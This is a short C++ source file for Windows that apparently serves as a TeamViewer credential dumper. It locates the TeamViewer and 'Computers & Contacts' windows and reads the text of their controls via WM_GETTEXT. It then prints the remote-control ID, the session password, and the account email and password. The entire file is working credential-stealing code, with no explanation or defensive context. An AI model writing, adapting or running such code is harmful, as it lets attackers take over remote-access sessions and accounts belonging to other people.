#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <iostream>
#pragma comment( lib, "kernel32" )
#pragma comment( lib, "user32" )
 
int status = 0;
 
BOOL CALLBACK EnumMainTVWindow(HWND hwnd, LPARAM lParam)
{
        const int BufferSize = 1024;
        char BufferContent[BufferSize] = "";
        SendMessage(hwnd, WM_GETTEXT, (WPARAM)BufferSize, (LPARAM)BufferContent);
       
        if (status == 1)
        {
                printf("%s\n", BufferContent);
                status = 0;
        }
 
        if (strstr(BufferContent, "Allow Remote Control") != NULL)
        {
                status = 1;
                printf("TeamViewer ID: ");
        }
       
        if (strstr(BufferContent, "Please tell your partner") != NULL)
        {
                status = 1;
                printf("TeamViewer PASS: ");
        }
 
        return 1;
}
 
BOOL CALLBACK EnumAccountWindow(HWND hwnd, LPARAM lParam)
{
        const int BufferSize = 1024;
        char BufferContent[BufferSize] = "";
        SendMessage(hwnd, WM_GETTEXT, (WPARAM)BufferSize, (LPARAM)BufferContent);
       
        if (status == 1)
        {
                printf("%s\n", BufferContent);
                status = 0;
        }
 
        if (strstr(BufferContent, "E-mail") != NULL)
        {
                status = 1;
                printf("E-mail: ");
        }
       
        if (strstr(BufferContent, "Password") != NULL)
        {
                status = 1;
                printf("Password: ");
        }
 
        return 1;
}
 
 
int main()
{
        HWND hwndTeamViewer = FindWindow(NULL, "TeamViewer");
 
        if (hwndTeamViewer)
        {
                EnumChildWindows(hwndTeamViewer, EnumMainTVWindow, 0);
        }
       
       
        HWND hwndAccount = FindWindow(NULL, "Computers & Contacts");
 
        if (hwndAccount)
        {
                EnumChildWindows(hwndAccount, EnumAccountWindow, 0);
        }
 
       
        return 0;
}
